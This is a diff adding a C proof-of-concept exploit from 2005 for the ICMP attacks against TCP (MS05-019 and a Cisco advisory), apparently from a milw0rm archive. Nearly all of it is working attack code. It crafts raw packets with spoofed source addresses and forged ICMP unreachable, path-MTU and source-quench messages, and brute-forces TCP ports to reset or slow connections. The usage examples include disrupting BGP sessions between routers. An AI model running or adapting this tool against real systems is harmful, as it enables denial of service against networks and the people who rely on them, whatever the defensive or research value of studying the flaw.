@@ -1,0 +1,460 @@
+/* HOD-icmp-attacks-poc.c: 2005-04-15: PUBLIC v.0.2
+*
+* Copyright (c) 2004-2005 houseofdabus.
+*
+*              (MS05-019) (CISCO:20050412)
+*       ICMP attacks against TCP (Proof-of-Concept)
+*
+*
+*
+*                 .::[ houseofdabus ]::.
+*
+*
+*
+* [ for more details:
+* [ http://www.livejournal.com/users/houseofdabus
+* ---------------------------------------------------------------------
+* Systems Affected:
+*    - Cisco Content Services Switch 11000 Series (WebNS)
+*    - Cisco Global Site Selector (GSS) 4480 1.x
+*    - Cisco IOS 10.x
+*    - Cisco IOS 11.x
+*    - Cisco IOS 12.x
+*    - Cisco IOS R11.x
+*    - Cisco IOS R12.x
+*    - Cisco IOS XR (CRS-1) 3.x
+*    - Cisco ONS 15000 Series
+*    - Cisco PIX 6.x
+*    - Cisco SAN-OS 1.x (MDS 9000 Switches)
+*    - AIX 5.x
+*    - Windows Server 2003
+*    - Windows XP SP2
+*    - Windows XP SP1
+*    - Windows 2000 SP4
+*    - Windows 2000 SP3
+*      ...
+*
+* ---------------------------------------------------------------------
+* Description:
+*    A denial of service vulnerability exists that could allow an
+*    attacker to send a specially crafted Internet Control Message
+*    Protocol (ICMP) message to an affected system. An attacker who
+*    successfully exploited this vulnerability could cause the affected
+*    system to reset existing TCP connections, reduce the throughput
+*    in existing TCP connections, or consume large amounts of CPU and
+*    memory resources.
+*    (CAN-2004-0790, CAN-2004-0791, CAN-2004-1060)
+*
+* ---------------------------------------------------------------------
+* Solution:
+*    http://www.microsoft.com/technet/security/Bulletin/MS05-019.mspx
+*    http://www.cisco.com/warp/public/707/cisco-sa-20050412-icmp.shtml
+*
+* Other References:
+*    http://www.gont.com.ar/drafts/icmp-attacks-against-tcp.html
+*    http://www.kb.cert.org/vuls/id/222750
+*
+* ---------------------------------------------------------------------
+* Tested on:
+*    - Windows Server 2003
+*    - Windows XP SP1
+*    - Windows 2000 SP4
+*    - Cisco IOS 11.x
+*
+* ---------------------------------------------------------------------
+* Compile:
+*
+* Win32/VC++  : cl -o HOD-icmp-attacks-poc HOD-icmp-attacks-poc.c
+* Win32/cygwin: gcc -o HOD-icmp-attacks-poc HOD-icmp-attacks-poc.c
+* Linux       : gcc -o HOD-icmp-attacks-poc HOD-icmp-attacks-poc.c
+*
+* ---------------------------------------------------------------------
+* Examples:
+*
+*   client <---> router <---> router <---> server
+*
+*   CLIENT <---> SERVER
+*
+*   HOD-icmp.exe -fi:serverIP -ti:clientIP -fp:80 -tp:1023 -a:1
+*   (abort the connection)
+*
+*   HOD-icmp.exe -fi:serverIP -ti:clientIP -fp:80 -tp:1023 -a:2
+*   (slow down the transmission rate for traffic)
+*
+*
+*   ROUTER1 <---> ROUTER2
+*
+*   HOD-icmp.exe -fi:routerIP2 -ti:routerIP1 -fp:179 -a:1
+*   (DoS Cisco BGP Connections)
+*
+*   HOD-icmp.exe -fi:routerIP2 -ti:routerIP1 -fp:80 -a:2
+*   (slow down the transmission rate for traffic)
+*
+* ---------------------------------------------------------------------
+*
+* This is provided as proof-of-concept code only for educational
+* purposes and testing by authorized individuals with permission
+* to do so.
+*
+*/
+
+/* #define _WIN32 */
+
+#ifdef _WIN32
+#pragma comment(lib,"ws2_32")
+#pragma pack(1)
+#define WIN32_LEAN_AND_MEAN
+#include <winsock2.h>
+/* IP_HDRINCL */
+#include <ws2tcpip.h>
+
+#else
+#include <sys/types.h>
+#include <netinet/in.h>
+#include <sys/socket.h>
+#include <stdio.h>
+#include <stdlib.h>
+#include <arpa/inet.h>
+#include <netdb.h>
+#include <sys/timeb.h>
+#endif
+
+#include <string.h>
+#include <stdio.h>
+#include <stdlib.h>
+
+#define MAX_PACKET         4096
+
+#define DEFAULT_PORT       80
+#define DEFAULT_IP         "192.168.0.1"
+#define DEFAULT_COUNT      1
+
+/* Define the IP header */
+typedef struct ip_hdr {
+       unsigned char  ip_verlen;       /* IP version & length */
+       unsigned char  ip_tos;          /* IP type of service */
+       unsigned short ip_totallength;  /* Total length */
+       unsigned short ip_id;           /* Unique identifier */
+       unsigned short ip_offset;       /* Fragment offset field */
+       unsigned char  ip_ttl;          /* Time to live */
+       unsigned char  ip_protocol;     /* Protocol */
+       unsigned short ip_checksum;     /* IP checksum */
+       unsigned int   ip_srcaddr;      /* Source address */
+       unsigned int   ip_destaddr;     /* Destination address */
+} IP_HDR, *PIP_HDR;
+
+/* Define the ICMP header */
+/* Destination Unreachable Message */
+typedef struct icmp_hdr {
+       unsigned char  type;            /* Type */
+       unsigned char  code;            /* Code */
+       unsigned short checksum;        /* Checksum */
+       unsigned long  unused;          /* Unused */
+} ICMP_HDR, *PICMP_HDR;
+
+/* 64 bits of Original Data Datagram (TCP header) */
+char msg[] =
+"\x00\x50"                              /* Source port */
+"\x00\x50"                              /* Destination port */
+"\x23\x48\x4f\x44";
+
+/* globals */
+unsigned long   dwToIP,                 /* IP to send to */
+               dwFromIP;               /* IP to send from (spoof) */
+unsigned short  iToPort,                /* Port to send to */
+               iFromPort;              /* Port to send from (spoof) */
+unsigned long   dwCount;                /* Number of times to send */
+unsigned long   Attack;
+
+void
+usage(char *progname) {
+       printf("Usage:\n\n");
+       printf("%s <-fi:SRC-IP> <-ti:VICTIM-IP> <-fi:SRC-PORT> [-tp:int] [-a:int] [-n:int]\n\n", progname);
+       printf("       -fi:IP    From (sender) IP address\n");
+       printf("       -ti:IP    To (target) IP address\n");
+       printf("       -fp:int   Target open TCP port number\n");
+       printf("                 (for example - 21, 25, 80)\n");
+       printf("       -tp:int   Inicial value for bruteforce (sender) TCP port number\n");
+       printf("                 (default: 0 = range of ports 0-65535)\n");
+       printf("       -n:int    Number of packets\n\n");
+       printf("       -a:int    ICMP attacks:\n");
+       printf("                    1 - Blind connection-reset attack\n");
+       printf("                        (ICMP protocol unreachable)\n");
+       printf("                    2 - Path MTU discovery attack\n");
+       printf("                        (slow down the transmission rate)\n");
+       printf("                    3 - ICMP Source Quench attack\n");
+       exit(1);
+}
+
+void
+ValidateArgs(int argc, char **argv)
+{
+       int i;
+
+       iToPort = 0;
+       iFromPort = DEFAULT_PORT;
+       dwToIP = inet_addr(DEFAULT_IP);
+       dwFromIP = inet_addr(DEFAULT_IP);
+       dwCount = DEFAULT_COUNT;
+       Attack = 1;
+
+       for (i = 1; i < argc; i++) {
+               if ((argv[i][0] == '-') || (argv[i][0] == '/')) {
+                       switch (tolower(argv[i][1])) {
+                               case 'f':
+                                       switch (tolower(argv[i][2])) {
+                                               case 'p':
+                                                       if (strlen(argv[i]) > 4)
+                                                       iFromPort = atoi(&argv[i][4]);
+                                                       break;
+                                               case 'i':
+                                                       if (strlen(argv[i]) > 4)
+                                                       dwFromIP = inet_addr(&argv[i][4]);
+                                                       break;
+                                               default:
+                                                       usage(argv[0]);
+                                                       break;
+                                       }
+                                       break;
+                               case 't':
+                                       switch (tolower(argv[i][2])) {
+                                               case 'p':
+                                                       if (strlen(argv[i]) > 4)
+                                                       iToPort = atoi(&argv[i][4]);
+                                                       break;
+                                               case 'i':
+                                                       if (strlen(argv[i]) > 4)
+                                                       dwToIP = inet_addr(&argv[i][4]);
+                                                       break;
+                                               default:
+                                                       usage(argv[0]);
+                                                       break;
+                                       }
+                                       break;
+                               case 'n':
+                                       if (strlen(argv[i]) > 3)
+                                       dwCount = atol(&argv[i][3]);
+                                       break;
+                               case 'a':
+                                       if (strlen(argv[i]) > 3)
+                                       Attack = atol(&argv[i][3]);
+                                       if ((Attack > 3) || (Attack < 1))
+                                       usage(argv[0]);
+                                       break;
+                               default:
+                                       usage(argv[0]);
+                                       break;
+                       }
+               }
+       }
+       return;
+}
+
+/*    This function calculates the 16-bit one's complement sum */
+/*    for the supplied buffer */
+unsigned short
+checksum(unsigned short *buffer, int size)
+{
+       unsigned long cksum = 0;
+
+       while (size > 1) {
+               cksum += *buffer++;
+               size  -= sizeof(unsigned short);
+       }
+       if (size) {
+               cksum += *(unsigned char *)buffer;
+       }
+       cksum = (cksum >> 16) + (cksum & 0xffff);
+       cksum += (cksum >>16);
+
+       return (unsigned short)(~cksum);
+}
+
+int
+main(int argc, char **argv)
+{
+
+#ifdef _WIN32
+       WSADATA         wsd;
+#endif
+       int             s;
+#ifdef _WIN32
+       BOOL            bOpt;
+#else
+       int             bOpt;
+#endif
+       struct sockaddr_in remote;
+       IP_HDR          ipHdr,
+                       ipHdrInc;
+       ICMP_HDR        icmpHdr;
+       int             ret;
+       unsigned long   i, p;
+       unsigned short  iTotalSize,
+                       iIPVersion,
+                       iIPSize,
+                       p2,
+                       cksum = 0;
+       char            buf[MAX_PACKET],
+                       *ptr = NULL;
+#ifdef _WIN32
+       IN_ADDR         addr;
+#else
+       struct sockaddr_in addr;
+#endif
+
+       printf("\n               (MS05-019) (CISCO:20050412)\n");
+       printf("       ICMP attacks against TCP (Proof-of-Concept)\n\n");
+       printf("        Copyright (c) 2004-2005 .: houseofdabus :.\n\n\n");
+
+       if (argc < 3) usage(argv[0]);
+
+       /* Parse command line arguments and print them out */
+       ValidateArgs(argc, argv);
+#ifdef _WIN32
+       addr.S_un.S_addr = dwFromIP;
+       printf("[*] From IP: <%s>, port: %d\n", inet_ntoa(addr), iFromPort);
+       addr.S_un.S_addr = dwToIP;
+       printf("[*] To   IP: <%s>, port: %d\n", inet_ntoa(addr), iToPort);
+       printf("[*] Count:   %d\n", dwCount);
+#else
+       addr.sin_addr.s_addr = dwFromIP;
+       printf("[*] From IP: <%s>, port: %d\n", inet_ntoa(addr.sin_addr), iFromPort);
+       addr.sin_addr.s_addr = dwToIP;
+       printf("[*] To   IP: <%s>, port: %d\n", inet_ntoa(addr.sin_addr), iToPort);
+       printf("[*] Count:   %d\n", dwCount);
+#endif
+
+#ifdef _WIN32
+       if (WSAStartup(MAKEWORD(2,2), &wsd) != 0) {
+               printf("[-] WSAStartup() failed: %d\n", GetLastError());
+               return -1;
+       }
+#endif
+       /*  Creating a raw socket */
+       s = socket(AF_INET, SOCK_RAW, IPPROTO_UDP);
+#ifdef _WIN32
+       if (s == INVALID_SOCKET) {
+#else
+       if (s < 0) {
+#endif
+               printf("[-] socket() failed\n");
+               return -1;
+       }
+
+       /* Enable the IP header include option */
+#ifdef _WIN32
+       bOpt = TRUE;
+#else
+       bOpt = 1;
+#endif
+       ret = setsockopt(s, IPPROTO_IP, IP_HDRINCL, (char *)&bOpt, sizeof(bOpt));
+#ifdef _WIN32
+       if (ret == SOCKET_ERROR) {
+               printf("[-] setsockopt(IP_HDRINCL) failed: %d\n", WSAGetLastError());
+               return -1;
+       }
+#endif
+
+       /* Initalize the IP header */
+       iTotalSize = sizeof(ipHdr) + sizeof(icmpHdr) + sizeof(msg)-1 + sizeof(ipHdrInc);
+
+       iIPVersion = 4;
+       iIPSize = sizeof(ipHdr) / sizeof(unsigned long);
+
+       ipHdr.ip_verlen = (iIPVersion << 4) | iIPSize;
+       ipHdr.ip_tos = 0;               /* IP type of service */
+                                       /* Total packet len */
+       ipHdr.ip_totallength = htons(iTotalSize);
+       ipHdr.ip_id = htons(42451);     /* Unique identifier */
+       ipHdr.ip_offset = 0;            /* Fragment offset field */
+       ipHdr.ip_ttl = 255;             /* Time to live */
+       ipHdr.ip_protocol = 0x1;        /* Protocol(ICMP) */
+       ipHdr.ip_checksum = 0;          /* IP checksum */
+       ipHdr.ip_srcaddr = dwFromIP;    /* Source address */
+       ipHdr.ip_destaddr = dwToIP;     /* Destination address */
+
+       ipHdrInc.ip_verlen = (iIPVersion << 4) | iIPSize;
+       ipHdrInc.ip_tos = 0;            /* IP type of service */
+                                       /* Total packet len */
+       ipHdrInc.ip_totallength = htons(sizeof(ipHdrInc)+20);
+       ipHdrInc.ip_id = htons(25068);  /* Unique identifier */
+
+       ipHdrInc.ip_offset = 0;         /* Fragment offset field */
+       ipHdrInc.ip_ttl = 255;          /* Time to live */
+       ipHdrInc.ip_protocol = 0x6;     /* Protocol(TCP) */
+       ipHdrInc.ip_checksum = 0;       /* IP checksum */
+       ipHdrInc.ip_srcaddr = dwToIP;   /* Source address */
+       ipHdrInc.ip_destaddr = dwFromIP;/* Destination address */
+
+       /* Initalize the ICMP header */
+       icmpHdr.checksum = 0;
+       if (Attack == 1) {
+               icmpHdr.type = 3;       /* Destination Unreachable Message */
+               icmpHdr.code = 2;       /* protocol unreachable */
+               icmpHdr.unused = 0;
+       } else if (Attack == 2) {
+               icmpHdr.type = 3;       /* Destination Unreachable Message */
+               icmpHdr.code = 4;       /* fragmentation needed and DF set */
+               icmpHdr.unused = 0x44000000; /* next-hop MTU - 68 */
+       } else {
+               icmpHdr.type = 4;       /* Source Quench Message */
+               icmpHdr.code = 0;
+               icmpHdr.unused = 0;
+       }
+
+       memset(buf, 0, MAX_PACKET);
+       ptr = buf;
+
+       memcpy(ptr, &ipHdr, sizeof(ipHdr));       ptr += sizeof(ipHdr);
+       memcpy(ptr, &icmpHdr, sizeof(icmpHdr));   ptr += sizeof(icmpHdr);
+       memcpy(ptr, &ipHdrInc, sizeof(ipHdrInc)); ptr += sizeof(ipHdrInc);
+       memcpy(ptr, msg, sizeof(msg)-1);
+       iFromPort = htons(iFromPort);
+       memcpy(ptr, &iFromPort, 2);
+
+       remote.sin_family = AF_INET;
+       remote.sin_port = htons(iToPort);
+       remote.sin_addr.s_addr = dwToIP;
+
+       cksum = checksum((unsigned short *)&ipHdrInc, 20);
+       memcpy(buf+20+sizeof(icmpHdr)+10, &cksum, 2);
+
+       cksum = checksum((unsigned short *)&ipHdr, 20);
+       memcpy(buf+10, &cksum, 2);
+
+       for (p = iToPort; p <= 65535; p++) {
+               p2 = htons((short)p);
+               memcpy((char *)(ptr+2), &p2, 2);
+               buf[22] = 0;
+               buf[23] = 0;
+               cksum = checksum((unsigned short *)(buf+20), sizeof(icmpHdr)+28);
+               memcpy(buf+20+2, &cksum, 2);
+
+               for (i = 0; i < dwCount; i++) {
+#ifdef _WIN32
+                       ret = sendto(s, buf, iTotalSize, 0, (SOCKADDR *)&remote,
+                               sizeof(remote));
+#else
+                       ret = sendto(s, buf, iTotalSize, 0, (struct sockaddr *) &remote,
+                       sizeof(remote));
+#endif
+#ifdef _WIN32
+                       if (ret == SOCKET_ERROR) {
+#else
+                       if (ret < 0) {
+#endif
+                               printf("[-] sendto() failed\n");
+                               break;
+                       }
+               }
+       }
+
+#ifdef _WIN32
+       closesocket(s);
+       WSACleanup();
+#endif
+
+       return 0;
+}
+
+// milw0rm.com [2005-04-20]
